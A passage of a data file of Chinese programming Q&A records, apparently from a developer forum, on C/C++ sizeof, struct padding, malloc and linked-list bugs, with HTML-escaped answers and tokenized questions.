a[])&lt;/span&gt;&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;长度%d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a)); &lt;span class=\"hljs-comment\"&gt;// 这里的a是数组&amp;#xff0c;所以sizeof(a)返回的是数组的大小&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;sort&lt;/span&gt;(a);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a[])&lt;/span&gt; &lt;span class=\"hljs-comment\"&gt;// 当数组当作参数传入函数时&amp;#xff0c;这个参数退化为指针&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;长度%d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a)); &lt;span class=\"hljs-comment\"&gt;// 所以这里的sizeof(a)返回的是指针的大小&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a) / &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;); i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n&amp;#34;&lt;/span&gt;, a[i]);\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;From &lt;a href=\"https://en.cppreference.com/w/c/language/array#Array-to-pointer-conversion\" id=\"textarea_1641988840562_1641989125083_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.cppreference.com/w/c/language/array#Array-to-pointer-conversion&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;When an array type is used in a function parameter list, it is transformed to the corresponding pointer type&lt;/strong&gt;: int f(int a[2]) and int f(int* a) declare the same function. Since the function&amp;#39;s actual parameter type is pointer type, a function call with an array argument performs array-to-pointer conversion; the size of the argument array is not available to the called function and must be passed explicitly:&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言，sizeof关键字的用法", ["# ", "include", "<stdio.h>", "\n", "#", "include", "<string.h>", "\n", "#", "pragma", " ", "warning", "(disable:4996)", "\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " a[] = { ", "5", ",", "4", ",", "4", ",", "4", "};\n    ", "int", " k;\n    ", "int", " m, n;\n    ", "int", " ", "sort", "(", "int", " a[])", ";\n    ", "printf", "(", "\"长度%d\\n\"", ", ", "sizeof", "(a));\n    ", "sort", "(a);\n    ", "return", " ", "0", ";\n}\n", "int", "  ", "sort", "(", "int", " a[])", " ", "{\n    ", "printf", "(", "\"长度%d\\n\"", ", ", "sizeof", "(a) );\n    ", "for", " (", "int", " i = ", "0", "; i < ", "sizeof", "(a)/", "sizeof", "(", "int", "); i++) {\n        ", "printf", "(", "\"%d\\n\"", ", a[i]);\n    }\n    ", "return", " ", "0", ";\n}\n\n\n", "\n", "为啥两次输出同一个数组，长度变化了", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;参考&amp;#xff1a;&lt;br /&gt;&lt;a href=\"https://www.cnblogs.com/pangblog/p/3292188.html\" id=\"textarea_1635432961510_1635433151568_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;C语言中 struct成员变量顺序对内存的占用 - pangbangb - 博客园&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;在C语言的结构体中&amp;#xff0c;是会按照其变量类型来进行分配内存大小的。但是对于不同的编译器&amp;#xff0c;结果是不同的&amp;#xff0c;在VC&amp;#43;&amp;#43;6.0中是怎么个分配情况呢&amp;#xff1f;用一下C中的关键字sizeof&amp;#xff08;&amp;#xff09;来测试下&amp;#xff0c;注意sizeof()不&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;img class=\"md_link_img\" id=\"md_link_img\" src=\"https://common.cnblogs.com/favicon.svg\" /&gt;\n        &lt;span class=\"flex-1\"&gt;\n          &lt;span class=\"md_link_url\"&gt;https://www.cnblogs.com/pangblog/p/3292188.html&lt;/span&gt;\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["结构体占用内存大小计算中遇到的问题", ["struct", " ", "st", "\n{\n    ", "double", " d;\n    ", "char", " c;\n    ", "short", " l;\n    ", "int", " i;\n}w;\n", "int", " ", "main", "()", "\n", "{\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "short", "));\n    ", "printf", "(", "\"%d\"", ", ", "sizeof", "(w));  ", "//此时我输出的是16", "\n}\n", "\n", "但是倒个次序就变成24了", "\n", "\n", "struct", " ", "st", "\n{\n    ", "double", " d;\n    ", "char", " c;\n    ", "int", " i;\n    ", "short", " l;     ", "//int和short倒了个次序", "\n}w;\n", "int", " ", "main", "()", "\n", "{\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(", "short", "));\n    ", "printf", "(", "\"%d\"", ", ", "sizeof", "(w));    ", "//这里就变成24了", "\n}\n", "\n", "不应该都可以补在char类型对齐空出来的那7个里面么，为啥倒一倒就不行了。想半天想不通哇"]], "Tag": "程序设计"}
{"Answer": "每次程序运行，变量都是重新来过的。\r\nstatic int x=0;\r\n此时是0\r\nx++是1\r\n然后读取\r\niofile.read( (char*)&amp;x,sizeof(x));\r\n那么文件里的x是多少，就是多少\r\n\r\n如果你希望每次都累加1，那么可以读取后，再++再write", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["各位大佬帮看看我的问题呗，谢谢啦", ["问题是这样的：", "\n我在一个函数中定义了一个静态局部变量：static int x=0;", "\n然后对x的操作是：x++;", "\n然后我利用对二进制文件的操作：", "\nfstream iofile (\"D:x的值\",ios::in | ios::out | ios::binary);", "\niofile.write( (char*)&x,sizeof(x));", "\n这样就把x的值存放在磁盘文件里了。", "\n问题：在第一次运行程序后很明显可知x的值为1，若第一次运行完之后，我关闭程序之后，再次打开此程序，在x++之前通过操作：iofile.read( (char*)&x,sizeof(x));", "\n得到x的值，此时x的值为 1 还是 0 呢？", "\n由于我还不知道结果，我还想问问如果是0的话怎么样才能让 x 在第二次运行程序时为 1 呢？", "\n这是我的大学计算机基础作业的一个关键点，想了好久没想出来，各位大佬帮看看吧，万分感谢！"]], "Tag": "程序设计"}
{"Answer": "访问结点，怎么还申请指针？什么逻辑？不要原来的链表了？\r\n```\r\n void Visit(BiTree T)\r\n{\r\n if(!(T=(BiTree)malloc(sizeof(BiTree))));\r\n printf(\"%d,\",T-&gt;data);\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["@数据结构大神：递归实现二叉树遍历，46、477行为什么错?", [" # include<stdio.h>\n# include<stdlib.h>\n# include<malloc.h>\n# define Max_Size 2\ntypedef struct Node{\n int data;\n struct Node *Lchild;\n struct Node *Rchild;\n}BiTNode,*BiTree;\nint x,k=0;\n\nvoid CreateBiTree(BiTree T)//L是节点 \n{\n while(k!=Max_Size)\n  {\n   scanf(\"%d\",&x);++k;//注意写法\n      //if(!(scanf(\"%d\",&x))) printf(\"NULL\");//T=NULL;//x不是数字 \n      if(!(T=(BiTree)malloc(sizeof(BiTree)))) exit(0);//已满，不能分配\n      else \n      {\n     T->data=x;\n     CreateBiTree(T->Lchild);\n     CreateBiTree(T->Rchild);\n      } \n  }\n}\n\nvoid Visit(BiTree T)\n{\n if(!(T=(BiTree)malloc(sizeof(BiTree))));\n printf(\"%d,\",T->data);\n}\n\nvoid PreOrder(BiTree T)\n{\n if(T!=NULL)\n if(T->Lchild!=NULL)\n if(T->Rchild!=NULL)\n    {\n  Visit(T);\n  PreOrder(T->Lchild);//全部遍历 ,哪里错了？ \n  PreOrder(T->Rchild);//全部遍历 ,哪里错了？ \n    }\n}\n\nint main(BiTree T)\n{   \n CreateBiTree(T);\n PreOrder(T);\n getch();\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;Dlink是个指针,指针的长度和指针指向的结构体的长度无关,所以只malloc指针大小的空间是不够的,必须至少分配足够的空间供结构体使用.&lt;br /&gt;&lt;code class=\"language-javascript\"&gt;有帮助望采纳~&lt;/code&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["使用malloc时sizeof(DLink)会报异常，sizeof(DNode)就不会（DLink是*DNode）", ["代码如下", "\n", "#include<iostream>\n#include<stdio.h>\n#include <malloc.h>\n#include <stdlib.h>\nusing namespace std;\n", "//sizeof(DLink)会报异常，sizeof(DNode)就不会", "\ntypedef struct DNode {\n    DNode * provide = NULL;\n    DNode * next = NULL;\n    int ", "data", " = -", "1", ";\n    int length = ", "0", ";\n}DNode,*DLink;\nbool ebbDNode(DLink p1 ,int index) {\n    DLink p2 = p1;\n    ", "for", " (int i = ", "0", "; i < index+", "1", " ; i++)\n    {\n        ", "p2", " = p2->", "next;\n    }\n    ", "p2", "->", "provide", "->", "next", " = p2->", "next;\n    ", "p2", "->", "next", "->", "provide", " = p2->", "provide;\n    ", "p2", "->", "length--;\n    return ", "true", ";\n}\nbool addDNode(DLink p1, int index, int num) {\n    DLink p2 = p1;\n    DLink newNode = (DLink)malloc(sizeof(DNode));\n    ", "for", " (int i = ", "0", "; i < index + ", "1", "; i++)\n    {\n        ", "p2", " = p2->", "next;\n    }\n    ", "p2", "->", "next", "->", "provide = newNode;\n    ", "newNode", "->", "next", " = p2->", "next;\n    ", "p2", "->", "next = newNode;\n    ", "newNode", "->", "data", " = num;\n    ", "p1", "->", "length++;\n    return ", "true", ";\n}\n\nint main() {\n    ", "//建表", "\n    DLink L1 = (DLink)malloc(sizeof(DNode));\n    ", "//L1->data = -1;", "\n    DLink p;\n    DLink r1;\n    r1 = L1;\n    p = L1;\n    ", "for", " (int i = ", "0", "; i < ", "10", "; i++)\n    {\n        DLink r = (DLink)malloc(sizeof(DNode));\n        ", "p", "->", "next = r;\n        ", "r", "->", "provide = p;\n        ", "r", "->", "data", " = i;\n        ", "r", "->", "next = NULL;\n        L1->length++;\n        p = r;\n        \n    }\n\n    ebbDNode(L1, ", "6", ");\n    addDNode(L1, ", "4", ", ", "3", ");", "//这一个函数会报异常", "\n    ", "for", " (int i = 0; r1->", "next != NULL; i++)\n    {\n        ", "printf", "(\"%d\\n\", r1->", "data", ");\n        ", "r1", " = r1->", "next;\n    }\n    return ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "我觉得可能是循环导致不停的添加数组？", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["php 内存不够 申请失败", ["for($k= sizeof($array);$k >$j;$k++){", "\n                    $array[$k] = $array[$k - 1];", "\n                }", "\n这种写法很占内存吗？", "\n报错：Allowed memory size of 134217728 bytes exhausted", "\n把php.ini中的memory_limit增大到 512M后，还是报错", "\nAllowed memory size of 536870912 bytes exhausted (tried to allocate 64 bytes)", "\n恰好也是4倍，我该怎么做？求大神帮帮忙"]], "Tag": "程序设计"}
{"Answer": "不往下看了，void CreatBiTree(BiTree* fm) 这里就不对，你主程序里定义的root，在这个函数里指向分配的地址，但是不会作用到主程序root上\r\n导致你的root是野指针，", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["大佬们帮忙看看这个二叉搜索树哪错了", ["先创立一个符合二叉搜索树的树，再进行查找key，找到便使指针p指向找到的位置，找不到便返回最后的位置，不知道哪错了；", "\n\n", "#include<stdio.h>\n#include<stdlib.h>\n\ntypedef char elemtype;\n\nenum {FALSE,TRUE};\n\ntypedef struct tree\n{\n    elemtype data;\n    struct tree *lchild;\n    struct tree *rchild;\n}BiTNode,*BiTree;\n\nvoid CreatBiTree(BiTree* fm)\n{\n    fm=(BiTree*)malloc(sizeof(BiTNode));\n    scanf(\"%c\",&(*fm)->data);\n    //getchar();\n    if((*fm)->data!=' ')//以空格表示没有子节点\n    {\n    CreatBiTree(&(*fm)->lchild);\n    CreatBiTree(&(*fm)->rchild);\n    }\n}\n\nint SearchBiTree(BiTree Node,int key,BiTNode *f,BiTNode *p)\n{\n    if(!Node)\n    {\n        *p=*f;\n        return FALSE;\n    }\n\n    if(key==Node->data)\n    {\n        *p=*Node;\n        return TRUE;\n    }\n\n    if(key<Node->data)\n    {\n        SearchBiTree(Node->lchild,key,Node,p);\n    }\n\n    if(key>Node->data)\n    {\n        SearchBiTree(Node->rchild,key,Node,p);\n    }\n}\n\nint main()\n{\n    printf(\"以前序遍历创建二叉树并使其符合二叉搜索树的特征\\n\"); \n    BiTree root;\n    CreatBiTree(&root);\n    elemtype key;\n    printf(\"输入需要搜索的值\\n\");\n    scanf(\"%c\",&key);\n    BiTree f,p;\n    f=(BiTree)malloc(sizeof(BiTNode));\n    p=(BiTree)malloc(sizeof(BiTNode));\n    f=NULL;\n    SearchBiTree(root,key,f,p);\n\n    return 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;不会啊&amp;#xff0c;只有单个字符的大小是1&amp;#xff0c;是不是都计算的单字符的大小&amp;#xff0c;参考如下&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/758589501546143.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;using&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;namespace&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;std&lt;/span&gt;;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; a&amp;#61;&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;char&lt;/span&gt; s&amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;double&lt;/span&gt; b&amp;#61;&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;char&lt;/span&gt; buf[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;]&amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; arr[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;]&amp;#61;{&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;};\n\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(s)&amp;lt;&amp;lt;endl;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;) &amp;lt;&amp;lt; endl;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;double&lt;/span&gt;) &amp;lt;&amp;lt; endl;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(a)&amp;lt;&amp;lt;endl;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(b)&amp;lt;&amp;lt;endl;\n\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(buf) &amp;lt;&amp;lt; endl;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(arr) &amp;lt;&amp;lt; endl;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["VScode C++ sizeof任何东西输出都为1", ["使用sizeof任何东西输出的大小都为1，这是什么原因。刚入门，求大家帮忙解答一下"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;strlen的结束标志是\\0&amp;#xff0c;char a[] &amp;#61; “father”&amp;#xff0c;会默认在father后面添加一个\\0&lt;/p&gt;\n&lt;p&gt;%s打印的结束标志也是\\0&amp;#xff0c;而char b[] 中没有放\\0&amp;#xff0c;所以打印出来是乱码&amp;#xff0c;strlen求值也是乱码&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言字符串和数组长度strlen和sizeof迷惑", ["c语言字符串和数组长度和sizeof迷惑", "\n", "代码", "\n", "int main() {", "    char a[] = \"father\";", "    char b[] = { 'f','a','t','h','e','r' };", "    int c[] = { 1,2,3,4,5,6 };", "    printf(\"%d\\n\", sizeof(a));", "    printf(\"%d\\n\", sizeof(a) / sizeof(a[0]));", "    printf(\"%d\\n\", strlen(a));", "    printf(\"%d\\n\", sizeof(b));", "    printf(\"%d\\n\", sizeof(b) / sizeof(b[0]));", "    printf(\"%d\\n\", strlen(b));", "    printf(\"%d\\n\", sizeof(c));", "    printf(\"%d\\n\", sizeof(c) / sizeof(c[0]));", "\n", "printf", "(", "\"%s\\n\"", ", a);\n", "printf", "(", "\"%c\\n\"", ", a[", "1", "]);\n\n", "printf", "(", "\"%s\\n\"", ", b);\n", "printf", "(", "\"%c\\n\"", ", b[", "1", "]);\n", "return", " ", "0", "；}\n", "\n", "结果", "\n", "7", "7", "6", "6", "6", "22", "24", "6", "father", "a", "father烫father", "a", "\n", "我的解答思路和尝试过的方法", "\n", "为什么a这种格式长度6+1，而b是6，内容不应该都是father\\0吗？", "a，b格式字符串不应该等价吗？，为什么b打印出来代码会出乱码。", "\n", "我想要达到的结果", "\n", "\n", "解答一下我的困惑 ", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;1个&lt;code class=\"language-javascript\"&gt;date&lt;/code&gt;包含3个&lt;code class=\"language-javascript\"&gt;int&lt;/code&gt;字段&amp;#xff0c;总计占用 3 * 4 &amp;#61; 12 个字节&lt;br /&gt;1个&lt;code class=\"language-javascript\"&gt;stud&lt;/code&gt;包含&lt;/p&gt;\n&lt;ul&gt;&lt;li&gt;1个长度为20的&lt;code class=\"language-javascript\"&gt;char&lt;/code&gt;数组&amp;#xff0c; 占用&amp;#xff1a;20 * 1 &amp;#61; 20 个字节&lt;/li&gt;&lt;li&gt;1个&lt;code class=\"language-javascript\"&gt;date&lt;/code&gt;&amp;#xff0c;占用&amp;#xff1a; 12个字节&lt;/li&gt;&lt;li&gt;1个长度为4的&lt;code class=\"language-javascript\"&gt;int&lt;/code&gt;数组&amp;#xff0c;占用&amp;#xff1a;4 * 4 &amp;#61; 16 个字节&lt;/li&gt;&lt;li&gt;一个&lt;code class=\"language-javascript\"&gt;float&lt;/code&gt;字段&amp;#xff0c;占用 4 个字节&lt;br /&gt;所以&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;sizeof(stud)&lt;/code&gt; 为 20 &amp;#43; 12 &amp;#43; 16 &amp;#43; 4 &amp;#61; 52&lt;/li&gt;&lt;/ul&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言sizeof计算结构大小的问题🥺", ["struct date //定义一个表示日期的结构体date", "{ int year, month, day; };", "struct stu //定义一个表示学生记录的结构体stu", "{ char name[20];", "struct date birthday;", "int Score[4];", "float ave;", "};", "执行printf(“%d\\n”,sizeof(stu));语句，输出结果是（ ）。", "A.40", "B.41", "C.52", "D.53", "这个怎么用sizeof计算结构体大小"]], "Tag": "程序设计"}
{"Answer": "错误太多了\r\n\r\nL=(LinkList)malloc(sizeof(LNode));\r\nL-&gt;next==NULL;\r\n-&gt;\r\nL=(LinkList)malloc(sizeof(LNode));\r\nL-&gt;next=NULL;\r\n\r\n/n -&gt; \\n\r\n可能还有别的错误，你先找个人家的程序学下", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个链表的初始化代码哪里错了，求大牛解释", ["#include", "\n#include", "\n#define ok 0", "\ntypedef int ElemType;", "\ntypedef struct LNode{", "\n    ElemType data;", "\n    struct LNode *next;", "\n}LNode,*LinkList;", "\n//初始化操作", "\nstruct InitList_L(Linklist&L){", "\n    L=(LinkList)malloc(sizeof(LNode));", "\n    L->next==NULL;", "\n    return ok;", "\n}", "\nint main()", "\n{", "\n    LNode=InitList();", "\n    if(LNode->next==NULL)", "\n    printf(\"初始化成功/n\");", "\n    return 0;", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第48行&amp;#xff0c;free(p),是把刚生成的链表的最后一个结点释放了&amp;#xff0c;链表断了尾巴&amp;#xff1f;&lt;br /&gt;第21行&amp;#xff0c;这句多余&amp;#xff0c;p 是指针&amp;#xff0c;在这里让它指向链表的头结点就可以了&amp;#xff0c;不需要申请一个空间。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言链表问题：为什么free(p)后二次用malloc分配内存会导致不能正确打印链表?", ["\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<malloc.h>", "\n", "#", "define", " OK 1", "\n", "#", "define", " ERROR 0", "\n", "typedef", " ", "int", " ElemType,Status;\n", "typedef", " ", "struct", " ", "LNode", "\n{\n    ElemType data;\n    ", "struct", " ", "LNode", " *next;\n}LNode,*LinkList,**LinkListP;\nLinkList L;\nLNode *p;\n", "Status ", "InitList", "(LinkListP L)", ";\n", "Status ", "CreatList_H", "(LinkListP L,", "int", " n)", ";\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " n;\n    ", "scanf", "(", "\"%d\"", ",&n);\n    ", "CreatList_H", "(&L,n);\n    p=(LNode *)", "malloc", "(", "sizeof", "(LNode));                          ", "//free(p)后二次动态分配内存", "\n    p=L->next;\n    ", "for", "(", "int", " i=", "0", ";i<n;i++)\n    {\n        ", "printf", "(", "\"%d\\n\"", ",p->data);\n        p=p->next;\n    }\n    ", "return", " ", "0", ";\n}\n\n", "Status ", "InitList", "(LinkListP L)", "\n", "{\n    *L=(LinkList)", "malloc", "(", "sizeof", "(LinkList));\n    (*L)->next=", "NULL", ";\n    ", "return", " OK;\n}\n\n", "Status ", "CreatList_H", "(LinkListP L,", "int", " n)", "\n", "{\n    ", "InitList", "(L);\n    ", "for", "(", "int", " i=", "0", ";i<n;i++)\n    {\n        p=(LNode *)", "malloc", "(", "sizeof", "(LNode));\n        ", "scanf", "(", "\"%d\"", ",&(p->data));\n        p->next=(*L)->next;\n        (*L)->next=p;\n    }\n    ", "free", "(p);p=", "NULL", ";                         ", "//删除此行链表正确打印", "\n    ", "return", " OK;\n}\n", "\n", "本人C关于内存方面的知识掌握得不是很牢固,望各位能指出的我的问题,谢谢！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;看错误提示&amp;#xff0c;少了括号或者分号。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在学大学生，数据结构栈的源文件敲书上的，错误求解答", ["\n", "源文件", "#include \"stack.h\"Status InitStack (SqStack &S){//构造一个空栈    S.base=(SElemType*)malloc(STACK_INIT_SIZE*sizeof(SElemType));    if(!S.base)exit(OVERFLOW);    S.top=S.base;    S.stacksize=STACK_INIT_SIZE;    return OK;}// InitStackStatus GetTop(SqStack S,SElemType &e){//若栈不空，则用e返回S的栈顶元素，并返回OK；否则返回error    if(S.top == S.base) return ERROR;    e = ", "(S.top-1);    return OK;}//GetTopStatus Push (SqStack &S,SElemType e){//插入元素e为新的栈顶元素    if(S.top - S.base >= S.stacksize)    {//栈满，追加存储空间        S.base = (SElemType", ")realloc( S.base,(S.stacksize + STACKINCREMENT)", "sizeof (SElemType));        if(!S.base)exit(OVERFLOW);//存储分配失败        S.top = S.base + S.stacksize;        S.stacksize += STACKINCREMENT;    }    ", "S.top++ = e;    return OK;}//PushStatus Pop(SqStack &S,SElemType &e){//若栈不空，则删除S的栈顶元素，用e返回其值，并返回OK；否则返回ERROR    if(S.top == S.base)return ERROR;    e = * --S.top;    return OK;}//Pop#include \"stack.h\"Status InitStack (SqStack &S){//构造一个空栈    S.base=(SElemType", ")malloc(STACK_INIT_SIZE", "sizeof(SElemType));    if(!S.base)exit(OVERFLOW);    S.top=S.base;    S.stacksize=STACK_INIT_SIZE;    return OK;}// InitStackStatus GetTop(SqStack S,SElemType &e){//若栈不空，则用e返回S的栈顶元素，并返回OK；否则返回error    if(S.top == S.base) return ERROR;    e = ", "(S.top-1);    return OK;}//GetTopStatus Push (SqStack &S,SElemType e){//插入元素e为新的栈顶元素    if(S.top - S.base >= S.stacksize)    {//栈满，追加存储空间        S.base = (SElemType", ")realloc( S.base,(S.stacksize + STACKINCREMENT)", "sizeof (SElemType));        if(!S.base)exit(OVERFLOW);//存储分配失败        S.top = S.base + S.stacksize;        S.stacksize += STACKINCREMENT;    }    ", "S.top++ = e;    return OK;}//PushStatus Pop(SqStack &S,SElemType &e){//若栈不空，则删除S的栈顶元素，用e返回其值，并返回OK；否则返回ERROR    if(S.top == S.base)return ERROR;    e = * --S.top;    return OK;}//Pop", "头文件", "#include \"stack.h\"Status InitStack (SqStack &S){//构造一个空栈    S.base=(SElemType", ")malloc(STACK_INIT_SIZE", "sizeof(SElemType));    if(!S.base)exit(OVERFLOW);    S.top=S.base;    S.stacksize=STACK_INIT_SIZE;    return OK;}// InitStackStatus GetTop(SqStack S,SElemType &e){//若栈不空，则用e返回S的栈顶元素，并返回OK；否则返回error    if(S.top == S.base) return ERROR;    e = ", "(S.top-1);    return OK;}//GetTopStatus Push (SqStack &S,SElemType e){//插入元素e为新的栈顶元素    if(S.top - S.base >= S.stacksize)    {//栈满，追加存储空间        S.base = (SElemType", ")realloc( S.base,(S.stacksize + STACKINCREMENT)*sizeof (SElemType));        if(!S.base)exit(OVERFLOW);//存储分配失败        S.top = S.base + S.stacksize;        S.stacksize += STACKINCREMENT;    }    *S.top++ = e;    return OK;}//PushStatus Pop(SqStack &S,SElemType &e){//若栈不空，则删除S的栈顶元素，用e返回其值，并返回OK；否则返回ERROR    if(S.top == S.base)return ERROR;    e = * --S.top;    return OK;}//Pop"]], "Tag": "程序设计"}
{"Answer": "代码顺序需要调整一下，`pOld`在赋值成`pNew`之前就必须`free`掉，不然第一次`malloc`出来的内存块就没有任何指针指向它了，也就是说我们失去了回收它的途径，所以正确的代码应该像下面这样：\r\n```\r\nint pOld = (int) malloc( sizeof(int));\r\nint pNew = (int) malloc( sizeof(int));\r\nfree(pOld);\r\npOld=pNew;\r\n```\r\n\r\n如果像之前的代码：\r\n```\r\npOld=pNew;\r\nfree(pOld);\r\n```\r\n这样`free`掉的其实是新申请的那块内存，因为`pOld`此时已经被赋值，指向了第二次`malloc`的内存块。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言内存管理问题，要注重细节", ["int ", "pOld = (int", ") malloc( sizeof(int) );", "\nint ", "pNew = (int", ") malloc( sizeof(int) );", "\npOld=pNew;", "\nfree(pOld);", "\n这样写代码，有什么问题？"]], "Tag": "程序设计"}
